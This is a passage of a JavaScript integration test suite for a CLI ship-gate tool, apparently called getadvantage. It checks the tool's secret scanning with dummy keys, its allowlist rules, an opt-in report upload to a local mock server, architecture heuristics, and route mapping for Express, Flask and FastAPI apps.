    assert.equal(parseJson(rStrip).verdict, "NO-GO");
    const stripSec = parseJson(rStrip).checks.find((c) => c.label === "Secret scan");
    assert.equal(stripSec.status, "fail");
    assert.ok(
      /Incomplete private key block/i.test((stripSec.extra || []).join("\n")),
      (stripSec.extra || []).join("\n"),
    );

    // --- constant header hash/value must not authorize incomplete PEMs ---
    const rsaHeader = "-----BEGIN RSA PRIVATE KEY-----";
    const headerHash = hashOf(rsaHeader);
    const hashRepo = path.join(base, "header-hash-no-auth");
    initRepo(hashRepo);
    write(hashRepo, "package.json", JSON.stringify({ name: "header-hash-no-auth", version: "1.0.0", private: true }, null, 2) + "\n");
    write(hashRepo, "keys/a.pem", truncated.rsa);
    write(hashRepo, "keys/b.pem", truncated.rsa.replace(/TRUNC1/, "TRUNC2"));
    write(
      hashRepo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { hashes: [headerHash], values: [rsaHeader] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(hashRepo, "chore: try to allowlist PEM header via hash+value");
    const rh = run(["check", "--json"], hashRepo);
    assert.equal(
      rh.code,
      1,
      `header hash/value must not authorize incomplete private keys\n${rh.stderr}\n${rh.stdout}`,
    );
    const hdoc = parseJson(rh);
    assert.equal(hdoc.verdict, "NO-GO");
    const hsec = hdoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(hsec.status, "fail");
    const hextra = (hsec.extra || []).join("\n");
    assert.ok(!/policy: hash|policy: value/i.test(hextra), `must not disclose value/hash allow for incomplete:\n${hextra}`);
    assert.ok(/Incomplete private key block/i.test(hextra), hextra);

    // path allowlist remains honest for incomplete PEMs (explicit fixture path)
    const pathRepo = path.join(base, "incomplete-path-ok");
    initRepo(pathRepo);
    write(pathRepo, "package.json", JSON.stringify({ name: "incomplete-path-ok", version: "1.0.0", private: true }, null, 2) + "\n");
    write(pathRepo, "fixtures/sample.pem", truncated.rsa);
    write(
      pathRepo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { paths: ["fixtures/**"] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(pathRepo, "chore: path allowlist for truncated fixture");
    const rpath = run(["check", "--json"], pathRepo);
    assert.equal(rpath.code, 0, `path allowlist must still work for incomplete PEMs\n${rpath.stderr}\n${rpath.stdout}`);
    assert.equal(parseJson(rpath).verdict, "GO");
    assert.ok(
      /policy: path/i.test(
        (parseJson(rpath).checks.find((c) => c.label === "Secret scan").extra || []).join("\n"),
      ),
    );

    // patternId private-key-incomplete is explicit; private-key alone must not blanket it
    const onlyFull = path.join(base, "patternid-full-only");
    initRepo(onlyFull);
    write(onlyFull, "package.json", JSON.stringify({ name: "patternid-full-only", version: "1.0.0", private: true }, null, 2) + "\n");
    write(onlyFull, "keys/trunc.pem", truncated.rsa);
    write(
      onlyFull,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { patternIds: ["private-key"] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(onlyFull, "chore: patternId private-key only");
    const rOnly = run(["check", "--json"], onlyFull);
    assert.equal(
      rOnly.code,
      1,
      "patternId private-key must not blanket private-key-incomplete",
    );
    assert.equal(parseJson(rOnly).verdict, "NO-GO");

    const expl = path.join(base, "patternid-incomplete");
    initRepo(expl);
    write(expl, "package.json", JSON.stringify({ name: "patternid-incomplete", version: "1.0.0", private: true }, null, 2) + "\n");
    write(expl, "keys/trunc.pem", truncated.rsa);
    write(
      expl,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { patternIds: ["private-key-incomplete"] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(expl, "chore: explicit incomplete patternId");
    const rExpl = run(["check", "--json"], expl);
    assert.equal(rExpl.code, 0, `explicit private-key-incomplete patternId must GO\n${rExpl.stderr}\n${rExpl.stdout}`);
    assert.equal(parseJson(rExpl).verdict, "GO");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 10. fan-out — namespaced branches, idempotent re-run
// ---------------------------------------------------------------------------
scenario("fan-out: creates ga/lane-N branches + worktrees; re-run skips, never clobbers", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const r1 = run(["fan-out", "2"], repo);
    assert.equal(r1.code, 0, r1.stderr);
    for (const i of [1, 2]) {
      g(["rev-parse", "--verify", "--quiet", `refs/heads/ga/lane-${i}`], repo); // throws if missing
      assert.ok(existsSync(path.join(base, `sample-lane-${i}`)), `worktree dir for lane ${i} must exist`);
    }
    // Re-run: both lanes exist → skipped (idempotent gap-filling, exit 0).
    const r2 = run(["fan-out", "2"], repo);
    assert.equal(r2.code, 0, r2.stderr);
    assert.ok(/already exists — skipped/.test(r2.stdout));
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 11. fan-out — a pre-existing lane branch is never silently reused
// ---------------------------------------------------------------------------
scenario("fan-out: pre-existing ga/lane-N branch → clear error, no silent reuse", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    g(["branch", "ga/lane-1"], repo); // leftover from an imaginary earlier fan-out

    const r = run(["fan-out", "1"], repo);
    assert.equal(r.code, 1, "reusing a stale lane branch must be an error");
    assert.ok(/refusing to silently reuse/.test(r.stderr), r.stderr);
    assert.ok(!existsSync(path.join(base, "sample-lane-1")), "no worktree may be attached to the stale branch");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 12. marker dir — legacy .ship-safe/ read; new writes go to .getadvantage/
// ---------------------------------------------------------------------------
scenario("marker dir: legacy .ship-safe/ still read (with note); writes → .getadvantage/", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const head = g(["rev-parse", "HEAD"], repo);
    // A save-point that predates the rename, in the legacy location only.
    write(
      repo,
      path.join(".ship-safe", "handoff.json"),
      JSON.stringify({ schema: 1, head_sha: head, branch: "main", generated_at: new Date().toISOString() }, null, 2) + "\n",
    );

    // gauge READS the legacy marker (so no "No save-point yet") + notes the migration.
    const r1 = run(["gauge"], repo);
    assert.equal(r1.code, 0, r1.stderr);
    assert.ok(/Session weight/.test(r1.stdout), `expected a gauge read, got:\n${r1.stdout}`);
    assert.ok(!/No save-point yet/.test(r1.stdout));
    assert.ok(/legacy \.ship-safe\//.test(r1.stderr), "expected the one-time migration note on stderr");

    // handoff WRITES to the new dir…
    const r2 = run(["handoff"], repo);
    assert.equal(r2.code, 0, r2.stderr);
    assert.ok(existsSync(path.join(repo, ".getadvantage", "handoff.json")));
    assert.ok(existsSync(path.join(repo, ".getadvantage", "ledger.md")));

    // …and once the new marker exists, reads prefer it (no legacy note anymore).
    const r3 = run(["gauge"], repo);
    assert.equal(r3.code, 0, r3.stderr);
    assert.ok(!/legacy \.ship-safe\//.test(r3.stderr), "new marker present — the legacy note must stop");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 13. --report connector — hermetic mock ingest server
// ---------------------------------------------------------------------------
scenario("--report: opt-in POST matches the ingest contract; nothing sent without it", async () => {
  const base = freshBase();
  const { createServer } = await import("node:http");
  const requests = []; // every request the mock ingest endpoint receives
  const server = createServer((req, res) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      requests.push({
        method: req.method,
        url: req.url,
        auth: req.headers.authorization,
        body: Buffer.concat(chunks).toString("utf8"),
      });
      res.writeHead(200, { "content-type": "application/json" });
      res.end(
        JSON.stringify({
          id: "run_t1",
          publicToken: "tok_t1",
          url: `http://127.0.0.1:${server.address().port}/r/tok_t1`,
        }),
      );
    });
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  try {
    const repo = scaffold(base);
    g(["remote", "add", "origin", "git@github.com:acme/widget.git"], repo);
    // Assembled at runtime so this test file never trips the secret scanner.
    const key = ["adv", "live", "k7f2m9x4p1q8r3s6t0uv"].join("_");
    const env = { GETADVANTAGE_API_URL: `http://127.0.0.1:${port}`, GETADVANTAGE_API_KEY: key };

    // LOCAL BY DEFAULT: without --report (and no GETADVANTAGE_REPORT), even with
    // a key + endpoint configured, the CLI must make ZERO network requests.
    const r0 = await runAsync(["check", "--json"], repo, env);
    assert.equal(r0.code, 0, r0.stderr);
    assert.equal(requests.length, 0, "nothing may be POSTed without explicit --report");

    // WITH --report (the exact command the GitHub Action runs): one POST,
    // matching the ingest contract.
    const r1 = await runAsync(["check", "--ci", "--report", "--json"], repo, env);
    assert.equal(r1.code, 0, r1.stderr);
    const doc = parseJson(r1); // stdout still carries exactly one JSON document
    assert.equal(doc.verdict, "GO");
    assert.equal(requests.length, 1, "exactly one POST with --report");
    const q = requests[0];
    assert.equal(q.method, "POST");
    assert.equal(q.url, "/api/v1/runs");
    assert.equal(q.auth, `Bearer ${key}`, "the key rides only in the Authorization header");
    const sent = JSON.parse(q.body);
    assert.equal(sent.kind, "check");
    assert.equal(sent.verdict, "GO");
    assert.equal(sent.exitCode, 0);
    assert.equal(sent.project.repo, "acme/widget", "owner/name normalized from the git@ remote");
    assert.ok(sent.payload && sent.payload.command === "check", "payload = the full --json report");
    assert.ok(Array.isArray(sent.payload.checks) && sent.payload.checks.length > 0);
    assert.equal(sent.ref.branch, "main");
    assert.equal(sent.ref.sha, g(["rev-parse", "HEAD"], repo));
    // The CLI prints the returned report url (human channel = stderr under --json).
    assert.ok(/verdict posted/.test(r1.stderr), r1.stderr);
    assert.ok(r1.stderr.includes(`http://127.0.0.1:${port}/r/tok_t1`), r1.stderr);
    // HONESTY: verdict + metadata only — the repo's source never rides along.
    assert.ok(!q.body.includes("hello from sample"), "source code must never be sent");
  } finally {
    server.close();
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 14. architecture scanner — accretion flagged; small repo quiet; advisory inert
// ---------------------------------------------------------------------------
scenario("architecture: oversized + duplicated flagged; small repo quiet; check advisory never gates", () => {
  const base = freshBase();
  try {
    // ---- an ACCRETED repo --------------------------------------------------
    const repo = scaffold(base);

    // (a) OVERSIZED: 1900 unique, meaningful lines — flag tier (>1800) — with
    //     churn: committed once, then grown twice (changed in 3 commits).
    const bigLines = [];
    for (let i = 0; i < 1900; i++) bigLines.push(`export const value${i} = compute(${i}) + offsets[${i % 7}];`);
    write(repo, "big.js", bigLines.join("\n") + "\n");
    commitAll(repo, "feat: big module");
    write(repo, "big.js", bigLines.join("\n") + "\nexport const tail1 = 1;\n");
    commitAll(repo, "feat: grow big module");
    write(repo, "big.js", bigLines.join("\n") + "\nexport const tail2 = 2;\n");
    commitAll(repo, "feat: grow big module again");

    // (b) DUPLICATION: one 18-line meaningful block, 3 occurrences across 2
    //     files (once in dup-a.js, twice in dup-b.js) — >= 3, the threshold.
    const block = [];
    for (let i = 0; i < 18; i++) block.push(`const rendered${i} = renderRow(items[${i}], formatPrice(prices[${i}], currency), locale);`);
    write(repo, "dup-a.js", [...block, "const onlyInA = finalizeA(rendered0);"].join("\n") + "\n");
    write(
      repo,
      "dup-b.js",
      [
        "const openingUniqueToB = prepare(context);",
        ...block,
        "const fillerOne = betweenCopies(1);",
        "const fillerTwo = betweenCopies(2);",
        "const fillerThree = betweenCopies(3);",
        ...block,
        "const closingUniqueToB = finalizeB(rendered0);",
      ].join("\n") + "\n",
    );
    commitAll(repo, "feat: duplicated renderers");

    const r = run(["architecture", "--json"], repo);
    assert.equal(r.code, 0, `architecture is ADVISORY — must exit 0\n${r.stderr}`);
    const doc = parseJson(r);
    assert.equal(doc.command, "architecture");
    assert.equal(doc.exitCode, 0);
    assert.ok(typeof doc.generatedAt === "string" && doc.generatedAt.includes("T"));
    assert.ok(doc.summary.oversized.flag >= 1, JSON.stringify(doc.summary));
    assert.ok(doc.summary.duplicateBlocks >= 3, `expected >=3 merged duplicate blocks, got ${doc.summary.duplicateBlocks}`);
    assert.equal(doc.summary.band, "severe");

    // big.js: the TOP candidate, with the size + churn signals spelled out.
    assert.ok(doc.candidates.length >= 3, JSON.stringify(doc.candidates.map((x) => x.file)));
    assert.equal(doc.candidates[0].file, "big.js", "the big × hot file must rank first");
    const big = doc.candidates[0];
    assert.ok(big.lines >= 1900, `lines: ${big.lines}`);
    assert.equal(big.sizeTier, "flag");
    assert.equal(big.churn, 3, `big.js was committed 3 times, churn: ${big.churn}`);
    assert.ok(big.signals.some((s) => /\d{4} lines/.test(s)), JSON.stringify(big.signals));
    assert.ok(big.signals.some((s) => /changed in 3 of the last \d+ commits/.test(s)), JSON.stringify(big.signals));

    // the duplicated block: flagged in BOTH files, cross-referenced.
    const dupA = doc.candidates.find((x) => x.file === "dup-a.js");
    const dupB = doc.candidates.find((x) => x.file === "dup-b.js");
    assert.ok(dupA && dupA.duplicateBlocks >= 1, `dup-a.js must be flagged: ${JSON.stringify(doc.candidates.map((x) => x.file))}`);
    assert.ok(dupB && dupB.duplicateBlocks >= 2, `dup-b.js holds TWO copies, got: ${JSON.stringify(dupB)}`);
    assert.ok(dupA.sharedWith.includes("dup-b.js"), JSON.stringify(dupA.sharedWith));
    assert.ok(dupA.duplicateRanges.length >= 1 && /^\d+-\d+$/.test(dupA.duplicateRanges[0]));

    // HONESTY: the human report frames this as measurement, and advisory.
    assert.ok(/measurement/.test(r.stderr), "expected the measurement-not-judgment framing");
    assert.ok(/never blocks a ship/.test(r.stderr), "expected the advisory framing");

    // `check` on the same repo: the quiet advisory line appears on the human
    // channel, but the verdict, exit code, and checks array are UNTOUCHED.
    const rc = run(["check", "--json"], repo);
    assert.equal(rc.code, 0, `advisory must never flip check's exit code\n${rc.stderr}`);
    const cdoc = parseJson(rc);
    assert.equal(cdoc.verdict, "GO");
    assert.ok(/architecture: \d+ large\/hot file/.test(rc.stderr), `expected the quiet advisory line:\n${rc.stderr}`);
    assert.ok(!cdoc.checks.some((ch) => /architecture/i.test(ch.label)), "the advisory must NOT be a check result");

    // ---- a small, quiet repo ------------------------------------------------
    const quiet = path.join(base, "quiet");
    initRepo(quiet);
    write(quiet, "package.json", JSON.stringify({ name: "quiet", version: "1.0.0", private: true, type: "module" }, null, 2) + "\n");
    write(quiet, "app.js", APP_JS);
    commitAll(quiet, "chore: tiny repo");

    const rq = run(["architecture", "--json"], quiet);
    assert.equal(rq.code, 0, rq.stderr);
    const qdoc = parseJson(rq);
    assert.equal(qdoc.candidates.length, 0, JSON.stringify(qdoc.candidates));
    assert.equal(qdoc.summary.band, "quiet");
    // HONESTY: quiet ≠ clean — the report must say the heuristics found
    // nothing, and must NOT claim the architecture is good.
    assert.ok(/found nothing to flag/.test(rq.stderr), rq.stderr);
    assert.ok(/not.*that the architecture is clean/.test(rq.stderr), rq.stderr);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 15. --version / -v — the version, nothing else (it used to run the full gate)
// ---------------------------------------------------------------------------
scenario("--version / -v: prints the package version, exit 0, never runs the gate; works outside a repo", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const ownPkg = JSON.parse(readFileSync(path.join(__dirname, "..", "package.json"), "utf8"));
    for (const args of [["--version"], ["-v"]]) {
      const r = run(args, repo);
      assert.equal(r.code, 0, r.stderr);
      assert.equal(r.stdout.trim(), ownPkg.version, `expected just the version for ${args[0]}`);
      assert.ok(!/Checks|Verdict/.test(r.stdout + r.stderr), `--version must not run the gate:\n${r.stdout}`);
    }
    // Version must work OUTSIDE a git repo too (it's not repo-bound).
    const r2 = run(["--version"], base);
    assert.equal(r2.code, 0, r2.stderr);
    assert.equal(r2.stdout.trim(), ownPkg.version);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 16. unknown flags on gate commands — loud error, never a silent exit 0
// ---------------------------------------------------------------------------
scenario("unknown gate flags: `check --bogus-flag` and `ship --wat` error with exit 1", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const r = run(["check", "--bogus-flag"], repo);
    assert.equal(r.code, 1, "an unknown flag on a gate command must exit 1, not silently run");
    assert.ok(/Unknown flag: --bogus-flag/.test(r.stderr), r.stderr);
    assert.ok(!/Verdict/.test(r.stdout + r.stderr), "the gate must not run with an unknown flag");

    const r2 = run(["ship", "--wat"], repo);
    assert.equal(r2.code, 1);
    assert.ok(/Unknown flag: --wat/.test(r2.stderr), r2.stderr);

    // Known flags still work (guard against over-eager validation).
    const r3 = run(["check", "--json", "--no-overview"], repo);
    assert.equal(r3.code, 0, r3.stderr);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 17. map on an Express repo — routes PARSED (methods, gating, ⚠) + estate view
// ---------------------------------------------------------------------------
scenario("map on an Express repo: routes parsed with methods + gating + mutating-ungated ⚠; estate/integrations intact", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(
      repo,
      "package.json",
      JSON.stringify(
        {
          name: "express-app",
          version: "1.0.0",
          private: true,
          dependencies: { express: "^4.19.0", openai: "^4.0.0" },
        },
        null,
        2,
      ) + "\n",
    );
    // /health is auth-gated (requireAuth middleware on the route line);
    // POST /api/pay MUTATES with no gate → must be flagged ⚠; /users is a plain GET.
    write(
      repo,
      "server.js",
      [
        "const express = require('express');",
        "const app = express();",
        "const requireAuth = (req, res, next) => next(); // demo auth middleware",
        "app.get('/health', requireAuth, (req, res) => res.send('ok'));",
        "app.post('/api/pay', (req, res) => res.json({ paid: true }));",
        "app.get('/users', (req, res) => res.json([]));",
        "app.listen(3000);",
        "",
      ].join("\n"),
    );
    write(repo, "lib/util.js", "module.exports = {};\n");
    commitAll(repo, "chore: express repo");

    const r = run(["map"], repo);
    assert.equal(r.code, 0, r.stderr);
    // (a) the scope line states the stack IS parsed now (no "estate view" dodge).
    assert.ok(/Detected: Express project/.test(r.stdout), `expected the stack scope line:\n${r.stdout}`);
    assert.ok(/reads your server.s route/.test(r.stdout), `route parsing must be stated:\n${r.stdout}`);
    // (b) the ROUTE TABLE is real: correct methods + gating tags.
    assert.ok(/\/health/.test(r.stdout) && /auth-gated/.test(r.stdout), `/health must show auth-gated:\n${r.stdout}`);
    assert.ok(/\/users/.test(r.stdout) && /public \(read-only\)/.test(r.stdout), `/users must be public read-only:\n${r.stdout}`);
    // (c) the mutating, ungated POST is FLAGGED with the ⚠ danger line.
    assert.ok(/\/api\/pay/.test(r.stdout), r.stdout);
    assert.ok(/mutates but no auth\/session check found/.test(r.stdout), `POST /api/pay must be flagged ⚠:\n${r.stdout}`);
    // (d) the Next.js-only disclaimer is GONE for this lane.
    assert.ok(!/App Router routes only/.test(r.stdout), "the parsed lane must drop the Next.js-only disclaimer");
    // (e) estate view + deps-based integrations still work.
    assert.ok(/Project estate/.test(r.stdout), r.stdout);
    assert.ok(/lib\/ — 1 file/.test(r.stdout), `expected the module inventory:\n${r.stdout}`);
    assert.ok(/Dependencies \(package\.json\): express, openai/.test(r.stdout), r.stdout);
    assert.ok(/OpenAI \(SDK\)/.test(r.stdout), `deps-based integration detection must fire:\n${r.stdout}`);
    assert.ok(!/nothing to map/i.test(r.stdout), "bare 'nothing to map' lines are banned");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 18. map on a Flask repo — @app.route parsed (methods, @login_required gate, ⚠)
// ---------------------------------------------------------------------------
scenario("map on a Flask repo: @app.route parsed with methods; @login_required gates /submit; POST /pay ⚠; integrations intact", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(repo, "requirements.txt", "flask==3.0.0\nanthropic>=0.25\n# a comment\n");
    write(
      repo,
      "app.py",
      [
        "from flask import Flask",
        "app = Flask(__name__)",
        "",
        "@app.route('/health')",
        "def health():",
        "    return 'ok'",
        "",
        "@app.route('/pay', methods=['POST'])",
        "def pay():",
        "    return 'paid'",
        "",
        "@app.route('/submit', methods=['POST'])",
        "@login_required",
        "def submit():",
        "    return 'done'",
        "",
      ].join("\n"),
    );
    write(repo, "src/models.py", "class Thing: pass\n");
    commitAll(repo, "chore: flask repo");

    const r = run(["map"], repo);
    assert.equal(r.code, 0, r.stderr);
    assert.ok(/Detected: Python \(Flask\) project/.test(r.stdout), `expected Python stack detection:\n${r.stdout}`);
    assert.ok(/reads your Python route/.test(r.stdout), `route parsing must be stated:\n${r.stdout}`);
    // Route table: methods correct; /submit gated by @login_required; POST /pay ⚠.
    assert.ok(/\/submit/.test(r.stdout) && /auth-gated/.test(r.stdout), `/submit must be auth-gated:\n${r.stdout}`);
    assert.ok(/\/pay/.test(r.stdout) && /\[POST\]/.test(r.stdout), `/pay must show [POST]:\n${r.stdout}`);
    assert.ok(/mutates but no auth\/session check found/.test(r.stdout), `POST /pay must be flagged ⚠:\n${r.stdout}`);
    assert.ok(!/App Router routes only/.test(r.stdout), "the parsed lane must drop the Next.js-only disclaimer");
    // Integrations from requirements.txt still detected.
    assert.ok(/Anthropic \(SDK\)/.test(r.stdout), `requirements.txt integrations must be detected:\n${r.stdout}`);
    assert.ok(/Dependencies \(Python\): flask, anthropic/.test(r.stdout), r.stdout);
    assert.ok(!/nothing to map/i.test(r.stdout));
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 20. map on a FastAPI repo — @router.get/post parsed; POST /items ⚠; Depends() gate
// ---------------------------------------------------------------------------
scenario("map on a FastAPI repo: @router.get/post parsed; POST /items ⚠ (mutates, ungated); Depends() gates /me", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(repo, "requirements.txt", "fastapi>=0.110\nuvicorn>=0.29\n");
    write(
      repo,
      "main.py",
      [
        "from fastapi import FastAPI, APIRouter, Depends",
        "app = FastAPI()",
        "router = APIRouter()",
        "",
        "@router.get('/items')",
        "def list_items():",
        "    return []",
        "",
        "@router.post('/items')",
        "def create_item(payload: dict):",
        "    return payload",
        "",
        "@app.get('/me')",
        "def me(user=Depends(get_current_user)):",
        "    return user",
        "",
        "app.include_router(router)",
        "",
      ].join("\n"),
    );
    commitAll(repo, "chore: fastapi repo");

    const r = run(["map"], repo);
    assert.equal(r.code, 0, r.stderr);
    assert.ok(/Detected: Python \(FastAPI\) project/.test(r.stdout), `expected FastAPI stack detection:\n${r.stdout}`);
    assert.ok(/reads your Python route/.test(r.stdout), `route parsing must be stated:\n${r.stdout}`);
    // GET + POST on /items both parsed; POST is the mutating, ungated ⚠.
    assert.ok(/\/items/.test(r.stdout) && /\[POST\]/.test(r.stdout) && /\[GET\]/.test(r.stdout), `both /items verbs must appear:\n${r.stdout}`);
    assert.ok(/mutates but no auth\/session check found/.test(r.stdout), `POST /items must be flagged ⚠:\n${r.stdout}`);
    // /me is gated by a FastAPI Depends(get_current_user) dependency.
    assert.ok(/\/me/.test(r.stdout) && /auth-gated/.test(r.stdout), `/me must be auth-gated via Depends():\n${r.stdout}`);
    assert.ok(/Dependencies \(Python\): fastapi, uvicorn/.test(r.stdout), r.stdout);
    assert.ok(!/App Router routes only/.test(r.stdout), "the parsed lane must drop the Next.js-only disclaimer");
    assert.ok(!/nothing to map/i.test(r.stdout));
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 19. map --help / mcp --help — command-specific help, not the generic wall
// ---------------------------------------------------------------------------
scenario("map --help / mcp --help: command-specific help with lanes / tools / MCP registration JSON", () => {
  const base = freshBase();
  try {
    const r = run(["map", "--help"], base); // help is not repo-bound
    assert.equal(r.code, 0, r.stderr);
    assert.ok(/Lanes/.test(r.stdout) && /Project estate/.test(r.stdout), `expected the map lanes:\n${r.stdout}`);
    assert.ok(!/fan-out/.test(r.stdout), "must be the map help, not the generic help wall");

    const r2 = run(["mcp", "--help"], base);
    assert.equal(r2.code, 0, r2.stderr);
    assert.ok(/save_handoff/.test(r2.stdout), `expected the tool list:\n${r2.stdout}`);
    assert.ok(/"mcpServers"/.test(r2.stdout), "must include the exact registration JSON snippet");
    assert.ok(/claude mcp add getadvantage/.test(r2.stdout), "must include the Claude Code one-liner");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 21. UTF-16 secret — the PowerShell-default encoding must not hide a leak
// ---------------------------------------------------------------------------
scenario("UTF-16 secret: a committed key in a UTF-16-LE file is scanned (not skipped as binary) → NO-GO", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(repo, "package.json", JSON.stringify({ name: "u16", version: "1.0.0", private: true }, null, 2) + "\n");
    // Assembled at runtime so this test file never trips the scanner itself.
    const stripeKey = "sk_live_" + "7".repeat(26);
    // A UTF-16-LE file WITH a BOM — exactly what PowerShell 5.1 `>` / Out-File
    // writes by default. Before 0.7.1 the NUL-after-every-ASCII-byte tripped the
    // "looks binary" skip, so the key was invisible (a false GO).
    const u16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`STRIPE_KEY=${stripeKey}\n`, "utf16le")]);
    writeFileSync(path.join(repo, "notes.txt"), u16);
    commitAll(repo, "chore: utf-16 notes with a key");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 1, `a UTF-16 file with a committed key must be NO-GO:\n${r.stderr}`);
    const doc = parseJson(r);
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.ok(secret && secret.status === "fail", JSON.stringify(doc.checks, null, 2));
    assert.ok(secret.extra.join("\n").includes("notes.txt"), "the UTF-16 file must be reported by name");
    assert.ok(!JSON.stringify(doc).includes(stripeKey), "the full secret must never be echoed");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 22. non-ASCII filename — git quotepath must not drop the file from the scan
// ---------------------------------------------------------------------------
scenario("non-ASCII filename: a committed key in a file with an umlaut name is scanned → NO-GO", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(repo, "package.json", JSON.stringify({ name: "umlaut", version: "1.0.0", private: true }, null, 2) + "\n");
    const stripeKey = "sk_live_" + "5".repeat(26);
    // A filename with an umlaut. git ls-files octal-escapes + quotes this by
    // default (core.quotepath on); before 0.7.1 the quoted path failed to open
    // and the file dropped out of the scan silently (a false GO for the DACH ICP).
    write(repo, "geheime_datei_über_prod.txt", `STRIPE_KEY=${stripeKey}\n`);
    commitAll(repo, "chore: secret in an umlaut-named file");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 1, `a key in an umlaut-named file must be NO-GO:\n${r.stderr}`);
    const doc = parseJson(r);
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.ok(secret && secret.status === "fail", JSON.stringify(doc.checks, null, 2));
    assert.ok(/ber_prod\.txt/.test(secret.extra.join("\n")), `the umlaut file must be reported:\n${JSON.stringify(secret)}`);
    assert.ok(!JSON.stringify(doc).includes(stripeKey), "the full secret must never be echoed");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 23. tsc declared-but-not-installed — honest warn, never a downloaded compiler
// ---------------------------------------------------------------------------
scenario("typecheck: TypeScript declared but not installed → honest warn, never `npx --yes tsc`", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    // tsconfig + a typescript devDependency → the repo is "typecheckable", but
    // node_modules is absent (a fresh clone). The gate must NOT `npx --yes tsc`
    // (that downloads a squatted third-party package); it warns to run install.
    write(repo, "package.json", JSON.stringify({ name: "ts-uninstalled", version: "1.0.0", private: true, devDependencies: { typescript: "^5.7.0" } }, null, 2) + "\n");
    write(repo, "tsconfig.json", JSON.stringify({ compilerOptions: { strict: true, noEmit: true } }, null, 2) + "\n");
    write(repo, "index.ts", "export const x: number = 1;\n");
    commitAll(repo, "chore: ts repo, deps not installed");

    const r = run(["check", "--json"], repo);
    const doc = parseJson(r);
    const typecheck = doc.checks.find((c) => c.label.startsWith("Typecheck"));
    assert.ok(typecheck && typecheck.status === "warn", JSON.stringify(doc.checks, null, 2));
    assert.ok(/not installed|npm install/.test(typecheck.detail), typecheck.detail);
    // It must NOT have run a compiler and reported type errors (that's the
    // third-party-`tsc` mislabel we're preventing).
    assert.ok(!/type errors/.test(typecheck.detail), "must not claim type errors when no compiler ran");
    // A warn alone keeps the verdict GO (exit 0) — the repo is otherwise clean.
    assert.equal(r.code, 0, `a missing-compiler warn must not itself NO-GO:\n${r.stderr}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 24. demo outside a repo — the "zero setup" showcase must not require a repo
// ---------------------------------------------------------------------------
scenario("demo: runs in a non-git directory (scaffolds its own repo), no repo-required dead-end", () => {
  const base = freshBase(); // NOT a git repo
  try {
    const r = run(["demo"], base);
    // demo always exits 0 (a "needs you" verdict is the point). Before 0.7.1 the
    // global repo-root gate fired first and it dead-ended with exit 1.
    assert.equal(r.code, 0, `demo must run outside a git repo:\n${r.stderr}`);
    assert.ok(!/Not inside a git repository/.test(r.stdout + r.stderr), "must not hit the repo-required gate");
    assert.ok(/Demo/.test(r.stdout + r.stderr), `expected the demo to run:\n${r.stdout}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 25. brief preserves manual notes across regenerations (0.7.2)
// ---------------------------------------------------------------------------
scenario("brief: regenerating PROJECT-BRIEF.md preserves the protected notes block", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base); // already committed

    // First generate seeds the notes markers + default template.
    const r1 = run(["brief"], repo);
    assert.equal(r1.code, 0, r1.stderr);
    const briefPath = path.join(repo, "PROJECT-BRIEF.md");
    assert.ok(existsSync(briefPath), "PROJECT-BRIEF.md must be written");
    let body = readFileSync(briefPath, "utf8");
    assert.ok(body.includes("<!-- getadvantage:project-brief -->"), "banner present");
    assert.ok(body.includes("<!-- getadvantage:brief:notes -->"), "notes start marker");
    assert.ok(body.includes("<!-- /getadvantage:brief:notes -->"), "notes end marker");
